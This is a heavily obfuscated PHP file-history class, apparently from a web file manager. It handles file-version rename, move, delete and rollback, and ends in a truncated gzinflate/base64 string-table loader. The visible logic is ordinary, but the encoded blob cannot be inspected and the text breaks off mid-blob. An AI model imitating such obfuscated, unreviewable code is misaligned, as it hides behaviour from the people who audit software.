eventBeforeRename($ÕÓÕİå) { $—£Š¡ =& $_SERVER[¯‘·½]; $ó”Ë£ïü = self::parsePath($ÕÓÕİå[0]); if (!$ó”Ë£ïü) { return; } $Î‹Û“éÃ = self::checkInHistory($ó”Ë£ïü); if (!$Î‹Û“éÃ) { return; } if ($Î‹Û“éÃ[$—£Š¡[33]] == $—£Š¡[233]) { $¨ÁÖÀØ‘ = self::listData($ó”Ë£ïü); if ($¨ÁÖÀØ‘ && $¨ÁÖÀØ‘[$—£Š¡[447]]) { self::moveHistory($ó”Ë£ïü, $ÕÓÕİå[1]); } } else { IO::rename($Î‹Û“éÃ[$—£Š¡[87]], $ÕÓÕİå[1]); } } public static function eventBeforeMove($Ë¡û§…í) { $£‡¨¶€ =& $_SERVER[¯‘·½]; $à–¼ó€Ç = self::parsePath($Ë¡û§…í[0]); if (!$à–¼ó€Ç) { return; } $òòŠ„ = self::parsePath($Ë¡û§…í[1]); if (!$òòŠ„) { return; } $ú˜ÌÆÏ… = $Ë¡û§…í[3]; $ßÌ¬¦ã— = self::checkInHistory($à–¼ó€Ç); if (!$ßÌ¬¦ã—) { return; } $¦ÅÔ÷Ãé = self::pathHistory($òòŠ„); if ($ßÌ¬¦ã—[$£‡¨¶€[33]] == $£‡¨¶€[233]) { $ÒÛ İ² = self::listData($à–¼ó€Ç); $¯§îÅÀØ = rtrim($òòŠ„, $£‡¨¶€[8]) . $£‡¨¶€[8] . ($ú˜ÌÆÏ… ? $ú˜ÌÆÏ… : get_path_this($à–¼ó€Ç)); $Ç¿õùæ = self::listData($¯§îÅÀØ); if ($ÒÛ İ² && $ÒÛ İ²[$£‡¨¶€[447]] && $Ç¿õùæ && $Ç¿õùæ[$£‡¨¶€[447]]) { return self::clear($à–¼ó€Ç); } if ($ÒÛ İ² && $ÒÛ İ²[$£‡¨¶€[447]]) { self::moveHistory($à–¼ó€Ç, $ú˜ÌÆÏ…, $¦ÅÔ÷Ãé); } } else { IO::move($ßÌ¬¦ã—[$£‡¨¶€[87]], $¦ÅÔ÷Ãé, !1, $ú˜ÌÆÏ…); self::clearEmptyFolder(IO::pathFather($ßÌ¬¦ã—[$£‡¨¶€[87]])); } } public static function eventAfterRemove($ª´äü, $ùïâíÚÃ) { $Ò‡˜ùÌÄ =& $_SERVER[¯‘·½]; if (!$ùïâíÚÃ) { return; } $¡ĞÄŞ–ı = self::parsePath($ª´äü[0]); if (!$¡ĞÄŞ–ı) { return; } $ø”®¢Õ = self::checkInHistory($¡ĞÄŞ–ı); if (!$ø”®¢Õ) { return; } if ($ø”®¢Õ[$Ò‡˜ùÌÄ[33]] == $Ò‡˜ùÌÄ[233]) { $éó•óà‡ = self::listData($¡ĞÄŞ–ı, !1); if ($éó•óà‡ && $éó•óà‡[$Ò‡˜ùÌÄ[447]]) { self::clear($¡ĞÄŞ–ı, !1); } } else { IO::remove($ø”®¢Õ[$Ò‡˜ùÌÄ[87]]); self::clearEmptyFolder(IO::pathFather($ø”®¢Õ[$Ò‡˜ùÌÄ[87]])); } } private static function checkInHistory($¶şÑË”ƒ) { $â¹’ÔÔ¥ = self::pathHistory($¶şÑË”ƒ); if (!IO::exist($â¹’ÔÔ¥)) { $â¹’ÔÔ¥ .= $_SERVER[¯‘·½][1340]; } return IO::exist($â¹’ÔÔ¥) ? IO::info($â¹’ÔÔ¥) : !1; } private static function parsePath($·ÊÍÜÑı) { $¡ŸØ°şË =& $_SERVER[¯‘·½]; if (!$·ÊÍÜÑı) { return !1; } if (isset($GLOBALS[$¡ŸØ°şË[1341]]) && $GLOBALS[$¡ŸØ°şË[1341]]) { return; } $ï·º¯¸ = KodIO::parse($·ÊÍÜÑı); $—ø¼Ğìö = $ï·º¯¸[$¡ŸØ°şË[33]]; $ä¦·Ç¸ = !$—ø¼Ğìö || $—ø¼Ğìö == KodIO::KOD_IO || $—ø¼Ğìö == KodIO::KOD_SHARE_ITEM; if (!$ä¦·Ç¸ || !$ï·º¯¸[$¡ŸØ°şË[1342]]) { return !1; } if (substr($·ÊÍÜÑı, 0, strlen(DATA_PATH . $¡ŸØ°şË[1343])) == DATA_PATH . $¡ŸØ°şË[1343]) { return !1; } if ($—ø¼Ğìö == KodIO::KOD_SHARE_ITEM) { $µˆ½–ú‰ = IO::init($·ÊÍÜÑı); if ($µˆ½–ú‰->pathParse[$¡ŸØ°şË[1254]]) { return self::parsePath($µˆ½–ú‰->pathParse[$¡ŸØ°şË[1254]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $€¦ˆŒ©¥ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¡ŸØ°şË[1344]); foreach ($€¦ˆŒ©¥ as $µø—Û´) { if (!$—ø¼Ğìö && substr($·ÊÍÜÑı, 0, strlen($µø—Û´)) == $µø—Û´) { return !1; } } self::log($GLOBALS[$¡ŸØ°şË[1248]] . $¡ŸØ°şË[1345] . $·ÊÍÜÑı); return $·ÊÍÜÑı; } private static function pathHistory($Ô¶İÖô´) { $ØãÉûÜ =& $_SERVER[¯‘·½]; $®æì·Éã = self::$_historyBase . ltrim(KodIO::clear($Ô¶İÖô´), $ØãÉûÜ[8]); $®æì·Éã = str_replace(array($ØãÉûÜ[1346]), array($ØãÉûÜ[1347]), $®æì·Éã); return $®æì·Éã; } public static function log($§¬¶“´Æ) { } public static function historyCount($µÅûšò£) { $Çê¿ëğ« =& $_SERVER[¯‘·½]; $ƒîÉ®ã§ = array(); $ñÍúÛÓú = array(); foreach ($µÅûšò£ as $«¢œÁæÛ) { $ÔÔ“Şä× = get_path_father($«¢œÁæÛ); if (!$ñÍúÛÓú[$ÔÔ“Şä×]) { $ñÍúÛÓú[$ÔÔ“Şä×] = array(); } $ñÍúÛÓú[$ÔÔ“Şä×][] = get_path_this($«¢œÁæÛ); } foreach ($ñÍúÛÓú as $ÔÔ“Şä× => $æ¡Á¼®é) { $İù¨áöÍ = self::parsePath($ÔÔ“Şä×); if (!$İù¨áöÍ) { continue; } foreach ($æ¡Á¼®é as $²ø¦çÓš) { $–Û­§…˜ = self::listData(rtrim($İù¨áöÍ, $Çê¿ëğ«[8]) . $Çê¿ëğ«[8] . $²ø¦çÓš, !1); if ($–Û­§…˜ && $–Û­§…˜[$Çê¿ëğ«[447]]) { $ƒîÉ®ã§[rtrim($ÔÔ“Şä×, $Çê¿ëğ«[8]) . $Çê¿ëğ«[8] . $²ø¦çÓš] = count($–Û­§…˜[$Çê¿ëğ«[447]]); } } } return $ƒîÉ®ã§; } public static function add($Å¸óŸĞŸ) { $²÷òˆ¬° =& $_SERVER[¯‘·½]; $È€‰å†× = self::listData($Å¸óŸĞŸ); if (!$È€‰å†×) { return; } $‹ä¹áéÊ = Model($²÷òˆ¬°[856])->get($²÷òˆ¬°[1348]); $×‡Ìü– = intval($GLOBALS[$²÷òˆ¬°[6]][$²÷òˆ¬°[92]][$²÷òˆ¬°[1326]]); $ù¶ä…Ÿâ = $‹ä¹áéÊ == $²÷òˆ¬°[1349] ? min(5, $×‡Ìü–) : $×‡Ìü–; if ($×‡Ìü– <= 0) { return; } $Ã¼Äááõ = IO::info($Å¸óŸĞŸ); $€­¨ÔåÚ = $È€‰å†×[$²÷òˆ¬°[447]]; if ($Ã¼Äááõ[$²÷òˆ¬°[79]] == 0) { return; } if ($Ã¼Äááõ[$²÷òˆ¬°[79]] >= 1024 * 1024 * 500) { return !1; } $œÄÅ‡Ó° = IO::hashSimple($Å¸óŸĞŸ); if ($€­¨ÔåÚ && $€­¨ÔåÚ[0][$²÷òˆ¬°[679]] == $œÄÅ‡Ó°) { return !0; } if (array_key_exists($²÷òˆ¬°[236], $Ã¼Äááõ) && !$Ã¼Äááõ[$²÷òˆ¬°[236]]) { return !1; } $ÓŞÓ÷„œ = short_id(time()); $®¦Î¬ = array($²÷òˆ¬°[477] => $ÓŞÓ÷„œ, $²÷òˆ¬°[679] => $œÄÅ‡Ó°, $²÷òˆ¬°[32] => $Ã¼Äááõ[$²÷òˆ¬°[32]] . $²÷òˆ¬°[10] . date($²÷òˆ¬°[1350]) . rand_string(1), $²÷òˆ¬°[79] => $Ã¼Äááõ[$²÷òˆ¬°[79]], $²÷òˆ¬°[529] => USER_ID, $²÷òˆ¬°[234] => time(), $²÷òˆ¬°[1351] => $²÷òˆ¬°[12]); IO::mkdir($È€‰å†×[$²÷òˆ¬°[1352]]); $«€®‡°õ = IO::copy($Å¸óŸĞŸ, $È€‰å†×[$²÷òˆ¬°[1352]], !1, $®¦Î¬[$²÷òˆ¬°[32]]); if (!$«€®‡°õ) { self::clearEmptyFolder($È€‰å†×[$²÷òˆ¬°[1352]]); return !1; } array_unshift($€­¨ÔåÚ, $®¦Î¬); if (count($€­¨ÔåÚ) > $ù¶ä…Ÿâ) { $’Ã¿¶°« = array_slice($€­¨ÔåÚ, $ù¶ä…Ÿâ); foreach ($’Ã¿¶°« as $È½İÊ²é) { IO::remove($È€‰å†×[$²÷òˆ¬°[1352]] . $È½İÊ²é[$²÷òˆ¬°[32]]); } $€­¨ÔåÚ = array_slice($€­¨ÔåÚ, 0, $ù¶ä…Ÿâ); } return self::saveData($È€‰å†×[$²÷òˆ¬°[1353]], $€­¨ÔåÚ); } public static function remove($š’¸ûÀ¼, $†çş®æ°) { $ğ‡à¡†é =& $_SERVER[¯‘·½]; $–«ä‡×¥ = self::listData($š’¸ûÀ¼); $„İÇå¾Ù = array(); if (!$–«ä‡×¥) { return !1; } foreach ($–«ä‡×¥[$ğ‡à¡†é[447]] as $Öî”ÊÎ˜) { if ($Öî”ÊÎ˜[$ğ‡à¡†é[477]] == $†çş®æ°) { IO::remove($–«ä‡×¥[$ğ‡à¡†é[1352]] . $Öî”ÊÎ˜[$ğ‡à¡†é[32]]); continue; } $„İÇå¾Ù[] = $Öî”ÊÎ˜; } return self::saveData($–«ä‡×¥[$ğ‡à¡†é[1353]], $„İÇå¾Ù); } public static function clear($½Ü£‡»›, $•¿ ù²µ = true) { $æÏÊä’´ =& $_SERVER[¯‘·½]; $õÑ½×Ÿ = self::listData($½Ü£‡»›, $•¿ ù²µ); if (!$õÑ½×Ÿ) { return !1; } foreach ($õÑ½×Ÿ[$æÏÊä’´[447]] as $‚¯•æ„×) { IO::remove($õÑ½×Ÿ[$æÏÊä’´[1352]] . $‚¯•æ„×[$æÏÊä’´[32]]); } return self::saveData($õÑ½×Ÿ[$æÏÊä’´[1353]], array()); } public static function moveHistory($¦¡¨Ş¦Ö, $ÀŠâ¿˜ = '', $‚¦•™½— = '') { $œê¤Æúø =& $_SERVER[¯‘·½]; $õ¢õ×Ø’ = self::listData($¦¡¨Ş¦Ö, !1); if (!$õ¢õ×Ø’ || !$õ¢õ×Ø’[$œê¤Æúø[447]]) { return !1; } $öüİ½Ë½ = $œê¤Æúø[1340]; $ÀŠâ¿˜ = $ÀŠâ¿˜ ? $ÀŠâ¿˜ : get_path_this($¦¡¨Ş¦Ö); $‚¦•™½— = $‚¦•™½— ? $‚¦•™½— : $õ¢õ×Ø’[$œê¤Æúø[1352]]; $òÁ¦·öŞ = substr(get_path_this($õ¢õ×Ø’[$œê¤Æúø[1353]]), 0, -strlen($öüİ½Ë½)); foreach ($õ¢õ×Ø’[$œê¤Æúø[447]] as $òÙŒµŞ­ => $í¸êÈĞ) { $¸îÎ³çˆ = $ÀŠâ¿˜ . substr($í¸êÈĞ[$œê¤Æúø[32]], strlen($òÁ¦·öŞ)); $Í’ÌÕà = IO::move($õ¢õ×Ø’[$œê¤Æúø[1352]] . $í¸êÈĞ[$œê¤Æúø[32]], $‚¦•™½—, !1, $¸îÎ³çˆ); if ($Í’ÌÕà) { $õ¢õ×Ø’[$œê¤Æúø[447]][$òÙŒµŞ­][$œê¤Æúø[32]] = $¸îÎ³çˆ; } } $õ¢õ×Ø’[$œê¤Æúø[1353]] = IO::move($õ¢õ×Ø’[$œê¤Æúø[1353]], $‚¦•™½—, !1, $ÀŠâ¿˜ . $öüİ½Ë½); self::saveData($õ¢õ×Ø’[$œê¤Æúø[1353]], $õ¢õ×Ø’[$œê¤Æúø[447]]); self::clearEmptyFolder($õ¢õ×Ø’[$œê¤Æúø[1352]]); } public static function rollback($õƒÂ‚÷®, $ÑÊóÒ‚’) { $åâ¦ôç¶ =& $_SERVER[¯‘·½]; $ÊâÅ‡¦ = self::listData($õƒÂ‚÷®); if (!$ÊâÅ‡¦) { return; } $˜¢©çš = IO::info($õƒÂ‚÷®); foreach ($ÊâÅ‡¦[$åâ¦ôç¶[447]] as $ÏºÔáŞ‘ => $Í¶‡‡Ò) { if ($Í¶‡‡Ò[$åâ¦ôç¶[477]] == $ÑÊóÒ‚’) { self::add($õƒÂ‚÷®); $÷Ô£Í´  = $ÊâÅ‡¦[$åâ¦ôç¶[1352]] . $Í¶‡‡Ò[$åâ¦ôç¶[32]]; $ì’´²Í° = IO::copy($÷Ô£Í´ , IO::pathFather($õƒÂ‚÷®), REPEAT_REPLACE, $˜¢©çš[$åâ¦ôç¶[32]]); if ($ì’´²Í°) { self::remove($õƒÂ‚÷®, $ÑÊóÒ‚’); } return $ì’´²Í°; } } return !1; } public static function setDetail($¡¼¯Íö´, $•¯€»õ, $°ŸÖç€¥) { $Œ‰Èæ¥‰ =& $_SERVER[¯‘·½]; $âşÄ·ë = self::listData($¡¼¯Íö´); if (!$âşÄ·ë) { return; } foreach ($âşÄ·ë[$Œ‰Èæ¥‰[447]] as $‰»ñ¿¥ó => $¶€µ«İƒ) { if ($¶€µ«İƒ[$Œ‰Èæ¥‰[477]] == $•¯€»õ) { $âşÄ·ë[$Œ‰Èæ¥‰[447]][$‰»ñ¿¥ó][$Œ‰Èæ¥‰[1351]] = $°ŸÖç€¥; self::saveData($âşÄ·ë[$Œ‰Èæ¥‰[1353]], $âşÄ·ë[$Œ‰Èæ¥‰[447]]); return !0; } } return !1; } public static function fileInfo($í’áøÈ, $äØÃÍüç) { $­³äŸ€ =& $_SERVER[¯‘·½]; $ĞÖáŒÄÑ = self::listData($í’áøÈ); if (!$ĞÖáŒÄÑ) { show_json(LNG($­³äŸ€[108]), !1); } $ÙÛ…ŒÂõ = $­³äŸ€[12]; foreach ($ĞÖáŒÄÑ[$­³äŸ€[447]] as $ÃÁ§‰ô => $êóÎÄÄ½) { if ($êóÎÄÄ½[$­³äŸ€[477]] != $äØÃÍüç) { continue; } $ÙÛ…ŒÂõ = $ĞÖáŒÄÑ[$­³äŸ€[1352]] . $êóÎÄÄ½[$­³äŸ€[32]]; break; } if (!$ÙÛ…ŒÂõ) { show_json(LNG($­³äŸ€[108]), !1); } return IO::info($ÙÛ…ŒÂõ); } public static function fileOut($Ü‚¶‹º›, $¬Øïİİ, $ÌüäÛ× = false) { $«ãİÜ‡Ü =& $_SERVER[¯‘·½]; $¬˜¿Î = self::fileInfo($Ü‚¶‹º›, $¬Øïİİ); $ê‰ÚÙŒ± =& $GLOBALS[$«ãİÜ‡Ü[7]]; $ÌüäÛ× = isset($ê‰ÚÙŒ±[$«ãİÜ‡Ü[1303]]) && $ê‰ÚÙŒ±[$«ãİÜ‡Ü[1303]] == 1; if (isset($ê‰ÚÙŒ±[$«ãİÜ‡Ü[33]]) && $ê‰ÚÙŒ±[$«ãİÜ‡Ü[33]] == $«ãİÜ‡Ü[1354]) { return IO::fileOutImage($¬˜¿Î[$«ãİÜ‡Ü[87]], $ê‰ÚÙŒ±[$«ãİÜ‡Ü[1355]]); } IO::fileOut($¬˜¿Î[$«ãİÜ‡Ü[87]], $ÌüäÛ×, get_path_this($Ü‚¶‹º›)); } public static function listData($­ŸˆŠÇë, $±ºÄê¾© = true) { $àˆá‰İ¶ =& $_SERVER[¯‘·½]; if ($±ºÄê¾© && !IO::exist($­ŸˆŠÇë)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($­ŸˆŠÇë, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $äèû¤ëÚ = self::pathHistory($­ŸˆŠÇë); $¯ãù«•Ä = array($àˆá‰İ¶[1353] => $äèû¤ëÚ . $àˆá‰İ¶[1340], $àˆá‰İ¶[1352] => rtrim(get_path_father($äèû¤ëÚ), $àˆá‰İ¶[8]) . $àˆá‰İ¶[8], $àˆá‰İ¶[447] => array()); $µØÃß‘ = IO::getContent($¯ãù«•Ä[$àˆá‰İ¶[1353]]); if ($µØÃß‘) { $´šô·í² = json_decode($µØÃß‘, !0); if (is_array($´šô·í²)) { $¯ãù«•Ä[$àˆá‰İ¶[447]] = $´šô·í²; } } return $¯ãù«•Ä; } private static function saveData($¾ˆö«úŸ, $óêø·ƒ°) { $ú™‘Áü =& $_SERVER[¯‘·½]; self::log($ú™‘Áü[1356] . $¾ˆö«úŸ . $ú™‘Áü[74] . count($óêø·ƒ°), $ú™‘Áü[837]); if ($óêø·ƒ°) { return IO::setContent($¾ˆö«úŸ, json_encode($óêø·ƒ°)); } $ÀöÊ«Ü– = IO::pathFather($¾ˆö«úŸ); IO::remove($¾ˆö«úŸ); self::clearEmptyFolder($ÀöÊ«Ü–); return !0; } public static function clearEmptyFolder($®Ãª‘×‹) { $™š‰è·  =& $_SERVER[¯‘·½]; if (trim($®Ãª‘×‹, $™š‰è· [8]) == trim(self::$_historyBase, $™š‰è· [8])) { return; } $çŒ–òŸû = IO::pathFather($®Ãª‘×‹); $ñïüªøî = IO::has($®Ãª‘×‹, !0); if ($ñïüªøî[$™š‰è· [242]] > 0 || $ñïüªøî[$™š‰è· [243]] > 0) { return; } IO::remove($®Ãª‘×‹); self::clearEmptyFolder($çŒ–òŸû); } private static function getBasePath() { $Ã¾ºøì  =& $_SERVER[¯‘·½]; $ê¥ÍË‰’ = Model($Ã¾ºøì [1357])->get($Ã¾ºøì [1358]); if ($ê¥ÍË‰’) { if (!IO::exist($ê¥ÍË‰’)) { IO::mkdir($ê¥ÍË‰’); } if (get_path_this($ê¥ÍË‰’) == $Ã¾ºøì [1343]) { $¹ĞùÚ©Â = $Ã¾ºøì [1359] . rand_string(8); @rename($ê¥ÍË‰’, get_path_father($ê¥ÍË‰’) . $Ã¾ºøì [8] . $¹ĞùÚ©Â); $ê¥ÍË‰’ = DATA_PATH . $¹ĞùÚ©Â . $Ã¾ºøì [8]; file_put_contents(DATA_PATH . $Ã¾ºøì [1290], $Ã¾ºøì [12]); Model($Ã¾ºøì [1357])->set($Ã¾ºøì [1358], $ê¥ÍË‰’); } return $ê¥ÍË‰’; } $ê¥ÍË‰’ = DATA_PATH . $Ã¾ºøì [1359] . rand_string(8) . $Ã¾ºøì [8]; $ê¥ÍË‰’ = IO::mkdir($ê¥ÍË‰’); $ê¥ÍË‰’ = rtrim($ê¥ÍË‰’, $Ã¾ºøì [8]) . $Ã¾ºøì [8]; file_put_contents($ê¥ÍË‰’ . $Ã¾ºøì [1290], $Ã¾ºøì [12]); file_put_contents(DATA_PATH . $Ã¾ºøì [1290], $Ã¾ºøì [12]); Model($Ã¾ºøì [1357])->set($Ã¾ºøì [1358], $ê¥ÍË‰’); return $ê¥ÍË‰’; } } goto c¾„¥©ëˆï; b½‰œÌŞ‘: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xaf\x91\x90\x8f\xb7\xbd", strrev('ş¬œ®”š')); $_SERVER[¯‘·½] = explode(base64_decode('fAN8BHwB'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x68\x69\x4b\x21\x40\xa1\x7f\x5b\xa0\x2d\x4b\x7\x43\x62\x3b\xd1\x62\x67\x8f\x13\x27\x91\x6d\xd9\x16\x91\x2d\x23\xc9\x59\x6d\x26\x63\x69\x24\x8d"."\55\151\144\315\310\133\22\366\35\2\201\262\23\50\224\122\350\102\302\22\226\2\1\312\116\131\132\372\176\12\151\201\376\100\354\44\354\155\241\300\317\322\167\227\163\227\31\311\341\177\337\173\337"."\367\2\211\346\336\173\356\176\356\271\347\236\173\316\271\147\274\371\376\325\37\274\266\376\33\353\277\271\176\237\211\217\57\276\342\243\75\364\33\375\267\57\372\217\174\377\370\374\375\277\106\376\174"."\357\374\363\152\152\332\347\36\60\243\363\240\213\266\335\252\375\106\273\125\333\30\11\77\363\154\350\333\317\377\346\370\340\304\215\317\214\116\354\363\265\335\273\176\74\273\1\1\323\274\15\364\107"."\311\233\266\242\217\30\226\155\321\210\204\231\117\31\151\372\155\344\351\257\237\376\164\107\303\105\75\147\332\72\15\372\350\217\12\355\42\377\132\203\131\203\245\253\235\221\270\32\353\356\352\12\106".strrev('D'."\n".'ê¯J²8W`–ÔšZ’‚Í>µ³RDDb;ÏAfS‹‘­BÑzúƒ–¢´|$Ìç§ Ô'."\0".'ã')."\x9f\x3a\x58\xd2\x8b\xa3\x34\x44\x3e\x63\xb6\x56\xb4\xe3\x46\x4e\xe7\x10\xc3\x45\xde\xae\xa6\x60\x5b\xa8\x53\x89\x47\x3\x9d\xb1\x40\x73\x3c\x14\xe9\xa4\xd1\xcd\x91\x8e\x8e\x50\xbc\x3c\x3e\x1a\x9\x87\x9b\x2\xcd".strrev('I_äèY²—Êi¡œWÀ-Ç5yŸ¤›='."\r".'Z?KR­e4µ”k2Ÿ#UÕ—Ú‚€¶¢ºSÊË')."\75\245\225\262\60\132\55\162\240\120\64\162\32\353\364\62\175\224\307\322\17\255\144\233\106\76\101\3\301\21\273\250\211\170\324\326\4\232\150\75\17\105\305\202\341\140\163\134\301\15\124\132\243"."\x91\xe\x5\x26\x21\xa7\x59\xb6\x5e\x54\x56\xb4\x7\xa3\x41\x5\x37\xba\xb1\x9a\xf4\xb5\x5a\x1\x7c\xe9\x44\x43\xa1\x4\xc2\x61\x65\xb2\x12\x6c\x3d\x57\x60\xc5\xd0\x3c\x15\xa\x8b\x44\x5b\x82\x51\xa5\x69\x95\x22".base64_decode('Rihh5nJm3odKQTNpS00NRqP0wwPoHQ7hSYNApLU1FuQh6NwJYdSSWYCfjlAylbXVIS1bYmg=').strrev('¦.6~ˆt+@ÃìıPcëˆ>¾BoÊ„ŒYÖƒ‚²ù4Â(S@%ÈĞwPM~á«@:')."\xbf\xb\x21\x7f\x9f\x8a\xd3\xf4\xa2\xad\xea\xf9\x84\x99\x34\xf2\xb0\x8e\x97\x0\x3e\x6a\x76\xa6\xa5\x68\x20\x0\x1a\x4e\x99\xd9\x24\xfb\xb6\x8c\x31\xe8\x65\xca\xc8\xea\x9d\xa5\x9c\xc\xc2\x83\x89\x8c\x91\x4d\x16"."\331\322\333\33\44\15\206\371\112\306\260\42\124\100\55\341\104\300\110\215\212\245\210\341\272\170\252\145\226\212\11\75\204\226\16\15\327\103\264\156\333\250\163\154\100\314\356\102\326\324\222\61\275"."\310\273\146\230\255\250\240\110\311\226\43\113\4\254\325\54\346\132\20\321\220\343\72\320\262\61\104\344\0\133\56\111\151\264\374\65\153\116\365\176\331\273\146\51\372\247\26\50\142\17\264\47\243"."\147\263\252\76\242\303\172\312\45\347\130\154\40\374\126\237\221\367\243\30\32\14\105\324\214\146\145\72\222\163\124\222\213\21\332\244\76\342\53\144\12\260\330\371\372\356\161\340\73\36\266\116\323".base64_decode('DkrkOmsmtKzcFfqdse1CTM8n8ShAV8zhPBmlgq4DUItHSSodyiqlvcFosFjGXJZ/sd7xOIs=')."\x47\xda\x23\x6c\x2a\x93\x29\xc0\x54\xb6\x5b\x54\x41\x85\x86\x45\x8\x9f\x58\xb5\x5a\xa1\x90\x35\x12\x9a\x6d\x98\x79\xbf\x99\xb0\x75\xdb\x6b\xd9\x45\x5d\x83\x12\x3\x89\x84\x6e\x59\xde\x66\x33\x6f\x17\xcd\xac\x37".base64_decode('kM2aw95I0Ugb+QZlOtBglIjWuhfTxQZYwFULFYw0uJrpjSU75Z3PFiaHLmp5K6UXvUFYFQ0=').strrev('Å€¡õ(RƒZs¥¨«·º!QaË×‘¬ùÀ½Æø¢,&‰kmš(5æàe¦'."\n".'°Å¬\',j'."\n".'')."\161\11\14\41\3\303\0\64\50\71\155\304\253\245\131\111\301\221\202\121\324\55\326\153\245\255\43\16\30\225\362\166\340\105\144\350\111\157\14\121\156\50\154\126\335\154\5\341\212\302\322\150\154".strrev('û&`2ƒhÓqTEëeÙ9ÔN¦Æ‹Ò¹H¼Ç¢0è¬ÒÖİ(væñ;TÜÖÑZ†¥Ş<{')."\xcc\x11\x1f\x4b\xc2\xc0\x31\x44\x55\x18\x30\x9e\xdf\x82\xed\x8d\x6a\xf9\x34\xee\x46\xdf\xa8\xad\x5b\x6e\xba\xd4\x84\x36\x72\x5f\x8a\xae\x5c\x5f\x9f\x9e\x32\x8b\xd0\x1b\x6b\x28\xed\x1c\xfc\xb0\x9e\x4f\xdb\x19\x56".base64_decode('diwYXR6MqrFIa3xFIAr7fh5hzghrDa49643qSTSICZvl0wpi9Fd68YLBlbNUvIhYWjjUhsc=').base64_decode('rsVrISCvDMXKDhs5A3fP5ilksBFT0AYN8pM+N/ZY02t6kjNqvejf6bVrelp803uX+A2Rx18=')."\xef\xab\x57\x66\xd6\xcd\x55\xba\x10\x97\x62\x68\x59\x5\x3a\x5d\x6\x51\xa7\x44\x96\x39\x87\x45\x60\x78\xde\xcc\xeb\x15\x17\x16\x42\x24\xd3\xd2\xbd\xed\xba\x86\x8\x34\x9a\x8\xc7\xbc\x78\x58\x5d\x34\xbc\x97\xd1"."\305\373\244\104\113\134\363\102\43\243\301\23\272\203\261\270\332\21\214\267\107\132\240\371\301\0\174\345\121\146\322\136\66\307\230\51\203\55\61\17\305\352\43\322\376\41\366\201\204\74\40\44\137"."\xa7\x39\xcc\x28\xbf\xb\x81\x9a\x33\x7a\x62\x60\x92\x34\xf4\x5\xbd\x31\x29\x5d\x62\x53\xb7\x86\xfe\xf4\x2\x36\xf7\xd2\x1f\x55\x6d\xe\x7\x3\x51\x15\xb8\x59\xd5\xb0\x5a\xa5\x2d\x14\x7\x39\xb9\x55\xcd\xbe\x7e".base64_decode('hGgdOttToOJQDi1p0RHVud+xXnYIxEcraIWR5BsiCrbrRjoD7TZwcQkzaxa1LN4KGA+bNoA=')."\52\27\262\45\264\14\374\270\340\170\246\224\353\203\215\13\15\131\132\267\5\173\151\215\42\36\54\307\66\147\264\303\333\241\26\307\26\14\41\277\212\121\267\307\127\310\247\153\217\203\262\324\231".base64_decode('c+pwBMwq9Azx2SW9vOu+hInWeYc2oDfgvgBxW0hiWUCinwvxltfoJhN4trK+HCqElNls8k0=')."\x9a\x9e\x64\x16\x3a\xb7\x3c\x45\x2f\x16\xcd\xe2\x31\x0\x41\xbe\x15\xb2\x6f\xe2\xe9\x82\xc2\x6d\xce\x81\x58\x88\x22\xb0\xef\x8c\xc9\x39\x16\x93\xe1\x66\x83\x1f\xfa\x3d\x75\x66\x2b\x50\x91\x24\xe2\xdc\x7c\x96\x8d"."\x26\x1\x75\x50\x4b\x26\x2b\x45\x23\xca\x3\x5\xac\x67\x68\x4b\x12\x18\x5b\xe0\x8f\xcd\x42\xff\xb\x1e\x20\x69\xe6\x34\xb6\xa3\x62\x42\xc4\xab\xc5\x1\x8b\x87\xc8\x36\xa9\x27\xe9\x3e\xe9\x88\xa2\xb\x9c\x46\x4d"."\x67\x55\x16\x6d\x13\x27\x16\x1d\x90\x8\x49\x33\x26\x34\x1a\x61\x5\x74\xb8\xc4\x7b\xce\xc6\x20\xa9\x67\x75\x86\x60\x19\x9d\xb1\x1a\x75\x0\x86\x66\x86\xa3\x5f\x8a\xaf\x3\x74\x90\x40\xb1\x82\xbf\x33\xac\x28\xca"."\x89\x19\x3\x16\x5e\x81\x4f\x5e\x22\x2\x73\x47\x80\x57\xe2\x33\x8b\x66\x35\x42\x16\x94\x8\x77\x15\xf5\x94\x31\xc2\x48\xc9\x88\xdd\xa1\x15\x7\x58\xc7\x50\x4e\xb1\x14\x71\x40\x5a\xa6\xad\xdd\xe1\xb0\xda\x1c\xe9"."\x8c\xa3\x83\x1b\x8d\x59\x11\xd\xc5\x83\x8c\x62\x5\x5a\xd4\x40\x73\x17\x84\x4\xd\xe4\xc\x9c\xcc\x82\xd0\x98\xa1\x99\x80\x42\xa8\x11\x7e\xc1\x2b\xa1\xcd\xba\x60\xe6\x11\xa5\x5\x62\xe5\x15\xc7\xba\xb2\xa4\xa4"."\x60\x25\x0\x77\x4\xfb\xe1\xe2\x28\x10\x4f\x90\x1b\xf3\xe6\x10\x5d\xf1\xf2\x36\x75\x75\x3\x2f\xc0\xb0\x82\xb1\xc4\x4d\xa3\x98\xdb\x65\xa4\x23\x9d\x5f\xce\x67\x7e\x45\x6c\xb6\xb7\xbd\x23\xd0\xec\x8d\xb5\x7\x66"."\xce\x99\x4b\x63\x57\xe5\x92\x3d\xf1\x76\xc3\xea\x59\xcd\xc3\xd0\x9c\x61\x6b\xb6\x5a\xd4\xd1\x9a\x66\xb8\x30\xb3\xae\x9e\xad\x38\xc4\x97\x68\xa2\xe5\xab\xbc\x39\x2f\x2e\x5\xb3\x94\xbe\xba\xba\x3a\x56\xd6\x8c\xb9"."\112\6\221\22\116\277\223\244\267\354\224\123\112\14\350\62\71\267\274\303\6\243\171\307\161\166\374\270\362\301\267\112\144\167\123\265\4\56\116\105\231\355\222\45\217\24\102\300\44\312\142\60\56"."\x99\xc6\x6a\xd9\xb4\x89\xf0\x2e\x93\x93\x23\x93\x1c\x7f\x69\x58\xa7\x2c\x17\x54\x94\xd1\xf8\x38\xe1\xd1\x63\x8b\x3\x31\x74\x